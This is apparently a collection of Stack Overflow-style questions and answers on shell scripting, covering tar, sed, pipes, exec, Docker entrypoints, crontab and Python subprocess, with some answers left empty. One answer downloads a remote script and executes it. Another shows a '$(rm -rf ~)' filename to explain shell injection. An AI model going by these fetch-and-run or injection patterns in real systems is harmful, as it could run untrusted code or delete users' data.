    "gzipping up a set of directories and creating a tar compressed file": "You can create a gzipped tar on the commandline as follows:\ntar czvf mytar.tar.gz dir1 dir2 .. dirN\nIf you wanted to do that in a bash script and pass the directories as arguments to the script, those arguments would end up in $@. So then you have:\ntar czvf mytar.tar.gz \"$@\"\nIf that is in a script (lets say myscript.sh), you would call that as:\n./myscript.sh dir1 dir2 .. dirN\nIf you want to read from a list (your option 1) you could do that like so (this does not work if there is whitespace in directory names):\ntar czvf mytar.tar.gz $(<config.txt)",
    "How can I get the list of all files that are sourced by bash?": "Reviving this question because there is an automation for this:\nExecute bash and carve it out of the output. -li is login interactively, -x prints out what bash is doing internally, and -c exit just tells bash to terminate immediately. Using sed to filter out the source command or the . alias.\n/bin/bash -lixc exit 2>&1 | sed -n 's/^+* \\(source\\|\\.\\) //p'",
    "GNU Screen - create screen in background run command from shell or script": "If you want to launch and connect to screen:\nscreen CMD\nIf you want to launch and not connect to screen:\nscreen -dm CMD\nWorks with sessions too:\nscreen -Sdm NewDetachedSessionName CMD\nYou can send keypresses to CMD with stuff:\nscreen -S NewDetachedSessionName -X stuff \"keypresses\"\nTo send a new-line, include \\n or ^M or $'\\n' with the keypresses.",
    "Simple Linux command line command to modify an option in a INI-like config file": "git config is actually a semi-generic INI interface.\n$ git config --file=/etc/default/nginx somegroup.ULIMIT '-n 4096'\n$ cat /etc/default/nginx\n[somegroup]\n    ULIMIT = -n 4096\n$ git config --file=/etc/default/nginx somegroup.ULIMIT\n\"-n 4096\"\nIt doesn't support adding top-level keys, though. All keys have to be placed in an INI style group, hence the \"somegroup.\" above. That makes it unsuitable for your task, but I thought I'd mention it here for others finding their way here.",
    "Inline PHP (command line)": "",
    "Ignore comments (#) using sed, but keep the lines untouched": "sed '/^#/!s/test/TEST/g' /path/to/infile\nOutput\n$ sed '/^#/!s/test/TEST/g' infile\nTEST\n# test\n# test\nTEST\n*Note: If your only requirement for a comment is that the very first non-whitespace character is a #, then you can use:\nsed '/^[[:space:]]*#/!s/test/TEST/g' /path/to/infile\nOutput\n$ sed '/^[[:space:]]*#/!s/test/TEST/g' infile\nTEST\n# test\n # test\nTEST",
    "what are shell built-in commands in linux?": "If you want to see how bash builtins are defined then you just need to look at Section 4 of The Bash Man Page.\nIf, however, you want to know how bash bultins are implemented, you'll need to look at the Bash source code because these commands are compiled into the bash executable.\nOne fast and easy way to see whether or not a command is a bash builtin is to use the help command. Example, help cd will show you how the bash builtin of 'cd' is defined. Similarly for help echo.",
    "Is it possible to write one script that runs in bash/shell and PowerShell?": "It is possible; I don't know how compatible this is, but PowerShell treats strings as text and they end up on screen, Bash treats them as commands and tries to run them, and both support the same function definition syntax. So, put a function name in quotes and only Bash will run it, put \"exit\" in quotes and only Bash will exit. Then write PowerShell code after.\nNB. this works because the syntax in both shells overlaps, and your script is simple - run commands and deal with variables. If you try to use more advanced script (if/then, for, switch, case, etc.) for either language, the other one will probably complain.\nSave this as dual.ps1 so PowerShell is happy with it, chmod +x dual.ps1 so Bash will run it\n#!/bin/bash\n\nfunction DoBashThings {\n    wget http://www.example.org/my.script -O my.script\n    # set a couple of environment variables\n    export script_source=http://www.example.org\n    export some_value=floob\n    # now execute the downloaded script\n    bash ./my.script\n}\n\n\"DoBashThings\"  # This runs the bash script, in PS it's just a string\n\"exit\"          # This quits the bash version, in PS it's just a string\n\n\n# PowerShell code here\n# --------------------\nInvoke-WebRequest \"http://www.example.org/my.script.ps1\" -OutFile my.script.ps1\n$env:script_source=\"http://www.example.org\"\n$env:some_value=\"floob\"\nPowerShell -File ./my.script.ps1\nthen\n./dual.ps1\non either system.\nEdit: You can include more complex code by commenting the code blocks with a distinct prefix, then having each language filter out its own code and eval it (usual security caveats apply with eval), e.g. with this approach (incorporating suggestion from Harry Johnston ):\n#!/bin/bash\n\n#posh $num = 200\n#posh if (150 -lt $num) {\n#posh   write-host \"PowerShell here\"\n#posh }\n\n#bash thing=\"xyz\"\n#bash if [ \"$thing\" = \"xyz\" ]\n#bash then\n#bash echo \"Bash here\"\n#bash fi\n\nfunction RunBashStuff {\n    eval \"$(grep '^#bash' $0 | sed -e 's/^#bash //')\"\n}\n\n\"RunBashStuff\"\n\"exit\"\n\n((Get-Content $MyInvocation.MyCommand.Source) -match '^#posh' -replace '^#posh ') -join \"`n\" | Invoke-Expression",
    "Makefile - Why is the read command not reading the user input?": "The immediate problem is that Make itself interprets the $ differently than the shell does. Try:\n    echo \"What is the root directory of your webserver? Eg. ~/Server/htdocs\"; \\\n    read root_path; \\\n    echo $$root_path\nThe double $$ escapes the $ for Make, so it passes the single $ through to the shell. Note also that you will need to use \\ line continuations so that the whole sequence is executed as one shell script, otherwise Make will spawn a new shell for each line. That means that anything you read will disappear as soon as its shell exits.\nI would also say that in general, prompting for interactive input from a Makefile is uncommon. You might be better off using a command line switch to indicate the web server root directory.",
    "Writing my own shell... stuck on pipes?": "First suggestion: Symbolic constants are better than magic numbers.\nconst int PIPE_READ = 0;\nconst int PIPE_WRITE = 1;\nint fd[2];\npipe(fd);\n// Now you can refer to fd[PIPE_READ] and fd[PIPE_WRITE].\nSecond suggestion: Take a step back and think about what you're trying to accomplish.\nYou want to spawn two processes, with the first process's stdout connected to the second process's stdin. Right?\nSo, in C, this means that you need to take call pipe, pass fd[PIPE_WRITE] to the first child process, which will dup2 it to 1, and pass fd[PIPE_READ] to the second child process, which will dup2 it to 0.\nSimply looking at forkAndExecute's prototype shows that it can't do that:\nvoid forkAndExecute( char* arrayOfWords[] , vector *vectorOfPIDs , \n    bool hasNextCmd , bool hasPrevCmd);\nIt only handles a single command, and from looking at that argument list, unless it resorts to evil global variables, there's no way for it to receive a file descriptor from its PrevCmd or receive a file descriptor from its NextCmd.\nThink about how to manage the file descriptors that you need, and redesign forkAndExecute to be able to use these.",
    "How to run from PHP a bash script under root user": "",
    "Output the root directory in a tar archive": "Use this to find out the top-level directory(-ies) of an archive.\ntar tzf nginx-1.0.0.tar.gz | sed -e 's@/.*@@' | uniq\nsed is invoked here to get the first component of a path printed by tar, so it transforms\npath/to/file --> path\nIt does this by executing s command. I use @ sign as a delimiter instead of more common / sign to avoid escaping / in the regexp. So, this command means: replace part of string that matches /.* pattern (i.e. slash followed by any number of arbitrary characters) with the empty string. Or, in other words, remove the part of the string after (and including) the first slash.\n(It has to be modified to work with absolute file names; however, those are pretty rare in tar files. But make sure that this theoretical possibility does not create a vulnerability in your code!)",
    "What does the line '!/bin/sh -e' do? [closed]": "That line defines what program will execute the given script. For sh normally that line should start with the # character as so:\n#!/bin/sh -e\nThe -e flag's long name is errexit, causing the script to immediately exit on the first error. A more detailed description from man sh:\nIf not interactive, exit immediately if any untested command fails. The exit status of a command is considered to be explicitly tested if the command is used to control an if, elif, while, or until; or if the command is the left hand operand of an && or || operator.",
    "How to use docker ENTRYPOINT with shell script file combine parameter": "When a Docker container is run, it runs the ENTRYPOINT (only), passing the CMD as command-line parameters, and when the ENTRYPOINT completes the container exits. In the Dockerfile the ENTRYPOINT has to be JSON-array syntax for it to be able to see the CMD arguments, and the script itself needs to actually run the CMD, typically with a line like exec \"$@\".\nThe single simplest thing you can do to clean this up is not to try to go back and forth between environment variables and positional parameters. The ENTRYPOINT script will be able to directly read the ENV variables you set in the Dockerfile (or override with docker run -e options). So if you delete the first lines of the script that set these variables from positional parameters, and make sure to run the CMD\n#!/bin/sh\n# delete the lines that set CONTAINER_NAME et al.\nrm -f /etc/nginx/sites-enabled/default\nsed -ri 's@CONTAINER_NAME@'${CONTAINER_NAME}'@' /etc/nginx/sites-available/ssl\n...\n# and add this at the end\nexec \"$@\"\nand then change the Dockerfile to not pass positional parameters but do use JSON-array syntax for ENTRYPOINT\nENTRYPOINT [\"/etc/nginx/docker-entrypoint.sh\"]\nCMD [\"nginx\"]\nthat should get you off the ground.\nIt's worth considering how much of this you actually need to be configurable. For instance, would you ever need a path different from the default /etc/nginx/certs inside the isolated container filesystem space? Usually with the standard nginx Docker Hub image you work with it by injecting an entire complete configuration file and if you choose to do that it simplifies your Docker setup.\nOther generic suggestions: remove the VOLUME declarations (they potentially cause confusing behavior later in the Dockerfile and leak anonymous volumes and aren't otherwise necessary); don't make executable files world-writable (chmod 0755, not 0777); RUN apt-get update && apt-get install in the same Dockerfile command.",
    "Why child process returns exit status = 32512 in unix?": "execvp takes a path to an executable, and arguments with which to launch that executable. It doesn't take bourne shell commands.\nls | wc is a bourne shell command (among others), and it can't be broken down into the path to an executable and some arguments due to the use of a pipe. This means it can't be executed using execvp.\nTo execute a bourne shell command using execvp, one has to execute sh and pass -c and the command for arguments.\nchar *const argv[] = {\n    \"sh\",\n    \"-c\", \"ls | wc\",  // Command to execute.\n    NULL\n};\n\nexecvp(argv[0], argv)\nAbout your attempts\nYou apparently tried\nchar *const argv[] = {\n    \"sh\",\n    \"-c\", \"ls\",  // Command to execute.\n    \"|\",         // Stored in called sh's $0.\n    \"wc\",        // Stored in called sh's $1.\n    NULL\n};\nThat would be the same as bourne shell command sh -c ls '|' wc.\nAnd both are very different than shell command sh -c ls | wc. That would be\nchar *const argv[] = {\n    \"sh\",\n    \"-c\", \"sh -c ls | wc\",  // Command to execute.\n    NULL\n};\nYou seem to think | and wc are passed to the sh, but that's not the case at all. | is a special character which results in a pipe, not an argument.\nAbout the exit code\nThe following is the format of the exit code:\nBits 15-8 = Exit code.\nBit     7 = 1 if a core dump was produced.\nBits  6-0 = Signal number that killed the process.\nYou got 32512, or 0x7F00.\nSo it didn't die from a signal, a core dump wasn't produced, and it exited with code 127 (0x7F).\nWhat 127 means is unclear, which is why it should accompanied by an error message. You tried to execute program ls | wc, but there is no such program.",
    "Check for symbolic link": "Use readlink;\n[~]> ln -s foo bar\n[~]> readlink bar \nfoo",
    "What's meaning of -print0 in following command": "With -print0, find will separate the filenames with a null character (a zero byte). xargs must then be called with -0 (or --null, I recommend using long options in scripts, which increase readability, and reserve shortenings for disposable commands in an interactive console).\nThis way, you can use spaces or whatever characters, including new-lines, in the filenames.",
    "How to convert a string into hexadecimal in Bash": "If you want to get the hex values of some string, then this works:\n$ echo \"testing some values\"$'\\157' | xxd\n0000000: 7465 7374 696e 6720 736f 6d65 2076 616c  testing some val\n0000010: 7565 736f 0a                             ueso.\nIf you just need the \"plain\" string:\n$ echo \"testing some values\"$'\\157' | xxd -p\n74657374696e6720736f6d652076616c7565736f0a\nIf you need to \"reverse\" an hex string, you do:\n$ echo \"74657374696e6720736f6d652076616c7565736f0a\" | xxd -r -p\ntesting some valueso\nIf what you need is the character representation (not hex), you could do:\n$ echo \"testing:\"$'\\001\\011\\n\\bend test'  | od -vAn -tcx1\n  t   e   s   t   i   n   g   : 001  \\t  \\n  \\b   e   n   d    \n 74  65  73  74  69  6e  67  3a  01  09  0a  08  65  6e  64  20\n  t   e   s   t  \\n\n 74  65  73  74  0a\nOr:\n$ echo \"testing:\"$'\\001\\011\\n\\bend test'  | od -vAn -tax1\n  t   e   s   t   i   n   g   : soh  ht  nl  bs   e   n   d  sp\n 74  65  73  74  69  6e  67  3a  01  09  0a  08  65  6e  64  20\n  t   e   s   t  nl\n 74  65  73  74  0a",
    "why wildcard doesn't work in `sudo rm` statement?": "The wildcard expansion is done by the shell, prior to actually calling sudo. And the shell itself does not have (or get) sudo rights, so it cannot read the contents of /var/log/jenkins/.\nBy the time rm (now bestowed with sudo rights) sees its arguments, wildcard expansion has already happened -- or rather, it has not, because there was nothing (readable by the shell) to match that *.\nSo rm attempts to delete the file (not the wildcard) /var/log/jenkins/* -- which does not exist:\nrm: cannot remove `/var/log/jenkins/*': No such file or directory\nTo get around this, you need a shell with sudo rights executing your rm:\nsudo sh -c 'rm /var/log/jenkins/*'\nNow the shell itself gets sudoed, and can do the expansion prior to calling rm.",
    "Ansible set_fact doesn't change the variable value": "The set_fact module effectively adds another host fact, ie. \"a fact discovered about the system\". From the documentation (http://docs.ansible.com/playbooks_variables.html#variable-precedence-where-should-i-put-a-variable) you can see that those facts have low priority, and will be overridden by extra-vars and various other things.\nThis can be confusing because using set_fact can make it seem like you are changing the value of the variable at that point, but maybe the name is the key to understanding - it's not 'set_variable', it's 'set_(host)fact', and host facts have low precedence. Precedence is more important than the order in which the value is assigned.\nOne workaround if you want to supply a value via extra-vars that gets overwritten later would be to reassign that extra-vars value to a different variable via set_fact at the start of your playbook, and then reassign that new variable later using set_fact again. Since they're at the same precedence level, the 'overwrite' should work as you would expect.",
    "How do create an alias in shell scripts? [duplicate]": "From the bash man page:\nAliases are not expanded when the shell is not interactive, unless the expand_aliases shell option is set using shopt (see the description of shopt under SHELL BUILTIN COMMANDS below).\nSo this should work:\n#!/bin/bash\nshopt -s expand_aliases\nalias I_am_only_ls_alias=ls\nI_am_only_ls_alias\nScripts usually use functions, not aliases.",
    "Assign the returned value of a function to a variable in unix shell script": "The value returned by the function is stored in $?, and is not captured by $().\nIn other words:\ntestFunction() \n{ \n    k=5\n    echo 3\n    return $k \n}\n\nval=$(testFunction)\necho $? # prints 5\necho $val  # prints 3",
    "VBA Shell function in Office 2011 for Mac": "The Shell() VBA function on Mac appears to require the full path as an HFS-style path (with colons instead of slashes). It also doesn't appear to accept arguments as it does on Windows (reporting a 'Path not found' error if any arguments are added).\nThe MacScript() VBA function can also be used: MacScript(\"do shell script \"\"command\"\"\"). This is likely to be the simplest option and what I would suggest doing. The downside is that it has quite a lot of overhead (100-200ms per call).\nAnother alternative is the system() function from the standard C library:\nPrivate Declare Function system Lib \"libc.dylib\" (ByVal command As String) As Long\n\nSub RunSafari()\n    Dim result As Long\n    result = system(\"open -a Safari --args http://www.google.com\")\n    Debug.Print Str(result)\nEnd Sub\nSee http://pubs.opengroup.org/onlinepubs/009604499/functions/system.html for documentation.\nsystem() only returns the exit code. If you want to get the output from the command, you could use popen().\nPrivate Declare Function popen Lib \"libc.dylib\" (ByVal command As String, ByVal mode As String) As Long\nPrivate Declare Function pclose Lib \"libc.dylib\" (ByVal file As Long) As Long\nPrivate Declare Function fread Lib \"libc.dylib\" (ByVal outStr As String, ByVal size As Long, ByVal items As Long, ByVal stream As Long) As Long\nPrivate Declare Function feof Lib \"libc.dylib\" (ByVal file As Long) As Long\n\nFunction execShell(command As String, Optional ByRef exitCode As Long) As String\n    Dim file As Long\n    file = popen(command, \"r\")\n\n    If file = 0 Then\n        Exit Function\n    End If\n\n    While feof(file) = 0\n        Dim chunk As String\n        Dim read As Long\n        chunk = Space(50)\n        read = fread(chunk, 1, Len(chunk) - 1, file)\n        If read > 0 Then\n            chunk = Left$(chunk, read)\n            execShell = execShell & chunk\n        End If\n    Wend\n\n    exitCode = pclose(file)\nEnd Function\n\nSub RunTest()\n    Dim result As String\n    Dim exitCode As Long\n    result = execShell(\"echo Hello World\", exitCode)\n    Debug.Print \"Result: \"\"\" & result & \"\"\"\"\n    Debug.Print \"Exit Code: \" & str(exitCode)\nEnd Sub\nNote that several of the Long arguments in the above example are pointers, so will have to be changed if a 64bit version of Mac Word is ever released.",
    "Testing a bash shell script [duplicate]": "Try this out: assert.sh\nsource \"./assert.sh\"\n\nlocal expected actual\nexpected=\"Hello\"\nactual=\"World!\"\nassert_eq \"$expected\" \"$actual\" \"not equivalent!\"\n# => x Hello == World :: not equivalent! ",
    "How do I pass an empty string with double quotes to a bash script?": "You are correctly passing an empty string argument to the script.\nIt is the script that is messing it up:\n#!/bin/bash\n/home/myapp $1 $2\nThe script is not protecting the expansion of $1 and $2 from word-splitting. This means that if $1 and $2 contain multiple words, those turn into individual arguments, and if either of them expand to nothing, they simply disappear.\nThis should be:\n#!/bin/bash\n/home/myapp \"$1\" \"$2\"\nIn general, you can make your script pass all of its arguments to the invoked program, like this:\n/home/myapp \"$@\"\nThe quotes are just shell syntax; they are not part of the argument data itself. When you type program \"\" into the shell, at the operating system level, the program receives an empty C language string: a pointer to a null byte. There are no quotes.\nYou can pass the argument \"\" (a two-character string made of two double quotes) but that is not an empty argument. A way to do that is, for instance, '\"\"': wrap it in single quotes.\nThe only reason to do things like that is when you're manipulating shell syntax at a meta-level: passing around pieces of shell script source code, such as quoted tokens, empty or otherwise. The shell has a command called eval which takes source code as an argument (or multiple arguments) and evaluates it.\nempty_shell_string_syntax='\"\"'    # this variable holds the characters \"\"\n\neval empty_var=$empty_shell_string_syntax   # empty_var gets set to empty string\nbefore eval is invoked, the command line is subject to expansion. That expansion removes the syntax $empty_shell_string_sytnax and replaces it with the contents, the characters \"\". So then eval gets the string empty_var=\"\". It evaluates this, and so empty_var is set to the empty string, as the syntax indicates.",
    "How to sort by two fields (one numeric, one string) at the same time using the built in \"sort\" program?": "From the manpage:\nPOS is F[.C][OPTS], where F is the field number and C the character position in the field; both are origin 1. If neither -t nor -b is in effect, characters in a field are counted from the beginning of the preceding whitespace. OPTS is one or more single-letter ordering options, which override global ordering options for that key. If no key is given, use the entire line as the key.\nsort -k4,4n -k1,1 bigfile ought to do it.\nAnother option would be sort -k1,1 bigfile | sort --stable -n -k4,4 The stable sort means that ties on the 4th field are resolved by the initial position, which is set by the first pass of sort to be first field.",
    "Pipes, dup2 and exec()": "You need to close all the pipe descriptors in both the parent process and the child process (after duplication in the child process). In your code the main issue is that, the wc process does not exit because there are still writers present (since the parent process has not closed the write end). Changes shown below. I have also added the waitpid in the parent process to wait for the wc process.\npid_t pid;\nint fd[2];\n\npipe(fd);\npid = fork();\n\nif(pid==0)\n{\n    dup2(fd[WRITE_END], STDOUT_FILENO);\n    close(fd[READ_END]);\n    close(fd[WRITE_END]);\n    execlp(firstcmd, firstcmd, frsarg, (char*) NULL);\n    fprintf(stderr, \"Failed to execute '%s'\\n\", firstcmd);\n    exit(1);\n}\nelse\n{ \n    pid=fork();\n\n    if(pid==0)\n    {\n        dup2(fd[READ_END], STDIN_FILENO);\n        close(fd[WRITE_END]);\n        close(fd[READ_END]);\n        execlp(scmd, scmd, secarg,(char*) NULL);\n        fprintf(stderr, \"Failed to execute '%s'\\n\", scmd);\n        exit(1);\n    }\n    else\n    {\n        int status;\n        close(fd[READ_END]);\n        close(fd[WRITE_END]);\n        waitpid(pid, &status, 0);\n    }\n}",
    "Run shell command and don't wait for return [duplicate]": "A single & symbol between commands will let each run independently without relying on the previous command having succeeded.",
    "how to set environment variable from file contents?": "Just use: set /P PATH=< dat\nYou must note that echo %PATH% > dat insert an additional space after %PATH% value; that space may cause problems if an additional path is later added to PATH variable. Just eliminate the extra space this way: echo %PATH%> dat.",
    "How redirect a shell command output to a Python script input ?": "Use sys.stdin to read the input . Example :\nExample content of s.py :\nimport sys\ndata = sys.stdin.readlines()\nprint data\n-- Running :\n    user@xxxxxxx:~$ cat t.txt\n    alpha\n    beta\n    gamma\n\n    user@xxxxxxx:~$ cat t.txt | python ./s.py\n    ['alpha\\n', 'beta\\n', 'gamma\\n']\nYou can also make the python script as shell script using this Shebang :\n#!/usr/bin/env python\nand changing permission to 'a+x'\n user@xxxxxxx:~$ cat t.txt |  ./s.py\n ['alpha\\n', 'beta\\n', 'gamma\\n']",
    "Equivalent of %~dp0 (retrieving source file name) in sh": "The problem (for you) with $0 is that it is set to whatever command line was use to invoke the script, not the location of the script itself. This can make it difficult to get the full path of the directory containing the script which is what you get from %~dp0 in a Windows batch file.\nFor example, consider the following script, dollar.sh:\n#!/bin/bash\necho $0\nIf you'd run it you'll get the following output:\n# ./dollar.sh\n./dollar.sh\n# /tmp/dollar.sh\n/tmp/dollar.sh\nSo to get the fully qualified directory name of a script I do the following:\ncd `dirname $0`\nSCRIPTDIR=`pwd`\ncd -\nThis works as follows:\ncd to the directory of the script, using either the relative or absolute path from the command line.\nGets the absolute path of this directory and stores it in SCRIPTDIR.\nGoes back to the previous working directory using \"cd -\".",
    "What is usage() in shell scripting?": "It's a just a convention. When something is wrong with the values supplied on the command line, people often use a function called usage() to tell you the problem/the values expected. For example:\n#!/bin/sh\nif [ $# -ne 1 ] ; then\n    usage\nelse\n    filename=$1\nfi\n...",
    "Grep and regex - why am I escaping curly braces?": "This is because {} are special characters and they need to handled differently to have this special behaviour. Otherwise, they will be treated as literal { and }.\nYou can either escape like you did:\n$ echo \"@NS500287\" | grep '^@NS500[0-9]\\{3\\}'\n@NS500287\nor use grep -E:\n$ echo \"@NS500287\" | grep -E '^@NS500[0-9]{3}'\n@NS500287\nWithout any processing:\n$ echo \"he{llo\" | grep \"{\"\nhe{llo\nFrom man grep:\n-E, --extended-regexp\nInterpret PATTERN as an extended regular expression (ERE, see below). (-E is specified by POSIX.)\n...\nREGULAR EXPRESSIONS\nA regular expression is a pattern that describes a set of strings. Regular expressions are constructed analogously to arithmetic expressions, by using various operators to combine smaller expressions.\ngrep understands three different versions of regular expression syntax: \u201cbasic,\u201d \u201cextended\u201d and \u201cperl.\u201d In GNU grep, there is no difference in available functionality between basic and extended syntaxes. In other implementations, basic regular expressions are less powerful. The following description applies to extended regular expressions; differences for basic regular expressions are summarized afterwards. Perl regular expressions give additional functionality, and are documented in pcresyntax(3) and pcrepattern(3), but may not be available on every system.\n...\nBasic vs Extended Regular Expressions\nIn basic regular expressions the meta-characters ?, +, {, |, (, and ) lose their special meaning; instead use the backslashed versions \\?, \\+, \\{, \\|, \\(, and \\).",
    "How to replace all occurrences in 1 file with sed?": "For Mac: Use -i.bak to add a backup file\nsed -i.bak 's/one/two/g' file.txt\nOr\nsed -i '' 's/one/two/g' file.txt\nFor Linux: Use sed -i on to do infile substitution\nsed -i 's/one/two/g' file.txt\nYou can also do something like below using a tmp file:\nsed 's/one/two/g' file.txt > tmp.txt && mv tmp.txt file.txt",
    "Android: How to create a homescreen shortcut to launch a shell script? [closed]": "",
    "Enable/Disable tasks in Crontab by Bash/Shell": "SERVERNUM=$1\nTo enable:\ncrontab -l | sed \"/^#.*Server $SERVERNUM check/s/^#//\" | crontab -\nTo disable:\ncrontab -l | sed \"/^[^#].*Server $SERVERNUM check/s/^/#/\" | crontab -\nTranscript:\nbarmar@dev$ crontab -l\n*/1 * * * * Server 1 check\n*/1 * * * * Server 2 check\n*/1 * * * * Server 3 check\nbarmar@dev$ crontab -l | sed '/^[^#].*Server 1 check/s/^/#/' | crontab -\nbarmar@dev$ crontab -l\n#*/1 * * * * Server 1 check\n*/1 * * * * Server 2 check\n*/1 * * * * Server 3 check\nbarmar@dev$ crontab -l | sed '/^#.*Server 1 check/s/^#//' | crontab -\nbarmar@dev$ crontab -l\n*/1 * * * * Server 1 check\n*/1 * * * * Server 2 check\n*/1 * * * * Server 3 check",
    "Symbolic link not inheriting permissions": "The permissions on a symbolic link are largely immaterial. They are normally 777 as modified by the umask setting.\nThe POSIX standard for symlink() says:\nThe values of the file mode bits for the created symbolic link are unspecified. All interfaces specified by POSIX.1-2008 shall behave as if the contents of symbolic links can always be read, except that the value of the file mode bits returned in the st_mode field of the stat structure is unspecified.\nPOSIX provides an lchown() system call; it does not provide an lchmod() function.\n(On my MacOS X 10.7.1, with umask 022, a newly created symlink ends up with 755 permissions; with umask 002, the permissions end up as 775. So, the observation that links are created with 770, 700 etc permissions may be accurate; the permissions settings are still immaterial, and do not affect the usability of the symlink.)\nFurther investigations about symlinks on RHEL 5 and MacOS X\nOn Linux (RHEL 5 for x86_64; kernel 2.6.18-128.el5), I only get to see 777 permissions on a symlink when it is created:\n$ (ls -l xx.pl; umask 777; ln -s xx.pl pqr; ls -l xx.pl pqr)\n-rw-r--r-- 1 jleffler rd 319 2011-09-05 22:10 xx.pl\nlrwxrwxrwx 1 jleffler rd   5 2011-09-21 10:16 pqr -> xx.pl\n-rw-r--r-- 1 jleffler rd 319 2011-09-05 22:10 xx.pl\n$\nI ran that in a sub-shell so the umask setting was not permanent.\nOn MacOS X (10.7.1), I get to see variable permissions on a symlink:\n$ (ls -l xxx.sql; umask 777; ln -s xxx.sql pqr; ls -l xxx.sql pqr)\n-rw-r--r--  1 jleffler  staff  1916 Jun  9 17:15 xxx.sql\n\nls: pqr: Permission denied\nl---------  1 jleffler  staff     7 Sep 21 10:18 pqr\n-rw-r--r--  1 jleffler  staff  1916 Jun  9 17:15 xxx.sql\n$\nNote that this is the same command sequence (give or take the file name) linked to.\nOn MacOS X, the chmod command has an option -h to change the permissions on a symlink itself:\n-h If the file is a symbolic link, change the mode of the link itself rather than the file that the link points to.\nOn MacOS X, the permissions on the symlink matter; you can't read the symlink unless you have read permission on the symlink (or you're root). Hence the error in the ls output above. And readlink failed. Etc.\nOn MacOS X, chmod -h 100 pqr (execute) allows me to use the link (cat pqr works) but not to read the link. By contrast, chmod -h 400 pqr allows me to both read the link and use the link. And for completeness, chmod -h 200 pqr allows me to use the link but not to read it. I assume, without having formally tested, the similar rules apply to group and other.\nOn MacOS X, then, it seems that read or write permission on a symlink allows you to use it normally, but execute permission alone means you cannot find where the link points (readlink(2) fails) even though you can access the file (or, presumably, directory) at the other end of the link.\nConclusion (subject to modification):\nOn some versions of Linux, you can only get 777 permission on a symlink.\nOn MacOS X, you can adjust the permissions on a symlink and these affect who can use the symlink.\nThe MacOS X behaviour is an extension of the behaviour mandated by POSIX - or deviation from the behaviour mandated by POSIX. It complicates life slightly. It means that you have to ensure that anyone who is supposed to use the link has permission to do so. This is normally trivial (umask 022 means that will be the case).\nThe underlying system call for chown -h on MacOS X is setattrlist(2).",
    "How does subprocess.call() work with shell=False?": "UNIX programs start each other with the following three calls, or derivatives/equivalents thereto:\nfork() - Create a new copy of yourself.\nexec() - Replace yourself with a different program (do this if you're the copy!).\nwait() - Wait for another process to finish (optional, if not running in background).\nThus, with shell=False, you do just that (as Python-syntax pseudocode below -- exclude the wait() if not a blocking invocation such as subprocess.call()):\npid = fork()\nif pid == 0: # we're the child process, not the parent\n  execlp(\"ls\", \"ls\", \"-l\", NUL);\nelse:\n  retval = wait(pid) # we're the parent; wait for the child to exit & get its exit status\nwhereas with shell=True, you do this:\npid = fork()\nif pid == 0:\n  execlp(\"sh\", \"sh\", \"-c\", \"ls -l\", NUL);\nelse:\n  retval = wait(pid)\nNote that with shell=False, the command we executed was ls, whereas with shell=True, the command we executed was sh.\nThat is to say:\nsubprocess.Popen(foo, shell=True)\nis exactly the same as:\nsubprocess.Popen(\n  [\"sh\", \"-c\"] + ([foo] if isinstance(foo, basestring) else foo),\n  shell=False)\nThat is to say, you execute a copy of /bin/sh, and direct that copy of /bin/sh to parse the string into an argument list and execute ls -l itself.\nSo, why would you use shell=True?\nYou're invoking a shell builtin.\nFor instance, the exit command is actually part of the shell itself, rather than an external command. That said, this is a fairly small set of commands, and it's rare for them to be useful in the context of a shell instance that only exists for the duration of a single subprocess.call() invocation.\nYou have some code with shell constructs (ie. redirections) that would be difficult to emulate without it.\nIf, for instance, your command is cat one two >three, the syntax >three is a redirection: It's not an argument to cat, but an instruction to the shell to set stdout=open('three', 'w') when running the command ['cat', 'one', 'two']. If you don't want to deal with redirections and pipelines yourself, you need a shell to do it.\nA slightly trickier case is cat foo bar | baz. To do that without a shell, you need to start both sides of the pipeline yourself: p1 = Popen(['cat', 'foo', 'bar'], stdout=PIPE), p2=Popen(['baz'], stdin=p1.stdout).\nYou don't give a damn about security bugs.\n...okay, that's a little bit too strong, but not by much. Using shell=True is dangerous. You can't do this: Popen('cat -- %s' % (filename,), shell=True) without a shell injection vulnerability: If your code were ever invoked with a filename containing $(rm -rf ~), you'd have a very bad day. On the other hand, ['cat', '--', filename] is safe with all possible filenames: The filename is purely data, not parsed as source code by a shell or anything else.\nIt is possible to write safe scripts in shell, but you need to be careful about it. Consider the following:\n  filenames = ['file1', 'file2'] # these can be user-provided\n  subprocess.Popen(['cat -- \"$@\" | baz', '_'] + filenames, shell=True)\nThat code is safe (well -- as safe as letting a user read any file they want ever is), because it's passing your filenames out-of-band from your script code -- but it's safe only because the string being passed to the shell is fixed and hardcoded, and the parameterized content is external variables (the filenames list). And even then, it's \"safe\" only to a point -- a bug like Shellshock that triggers on shell initialization would impact it as much as anything else.",
    "what does $* mean in a shell script": "It means all the arguments passed to the script or function, split by word.\nIt is usually wrong and should be replaced by \"$@\", which separates the arguments properly.",
    "Use emacsclient -t when committing in Git": "git config --global core.editor 'emacsclient -t -a=\\\"\\\"'\nThis will start a daemon if there is not already one running.\nYou may be having issues with quotation marks, as it shows up in my .gitconfig as\n[core]\n    editor = emacsclient -t -a=\\\\\\\"\\\\\\\"",
    "Running Shell commands though java code on Android?": "",
    "object-oriented shell for linux? [closed]": "Python. No joking.\nScripting languages are scripting languages, and Python is a particularly nice one that many people find very approachable.",
    "What does the syntax \"|&\" mean in shell language?": "From the bash man page:\nPipelines\nA pipeline is a sequence of one or more commands separated by one of the control operators | or |&. The format for a pipeline is:\n[time [-p]] [ ! ] command [ [|\u2502|&] command2 ... ]\nThe standard output of command is connected via a pipe to the standard input of command2. This connection is performed before any redirections specified by the command (see REDIRECTION below). If |& is used, the standard error of command is connected to command2\u2019s standard input through the pipe; it is shorthand for 2>&1 |. This implicit redirection of the standard error is performed after any redirections specified by the command.\nCheck your hash-bang line. Plain sh doesn't support |&.",
    "What does this command do? \"exec bash -l\"": "exec executes a specified command, replacing the current process rather than starting a new subprocess.\nIf you type\nbash -l\nat a shell prompt, it will invoke a new shell process (the -l makes it a login shell). If you exit that shell process, you'll be back to your original shell process.\nTyping\nexec bash -l\nmeans that the new shell process replaces your current shell process. It's probably slightly less resource intensive.\nThe reason for doing it is probably so that the new shell sets up its environment (by reading your .bashrc, .bash_profile, etc.).\nSee the bash documentation for more information:\nBash Startup Files for how a login shell differs from a non-login shell\nBourne Shell Builtins for documentation on the exec command.\n(You should be able to read the manual on your own system by typing info bash.)",
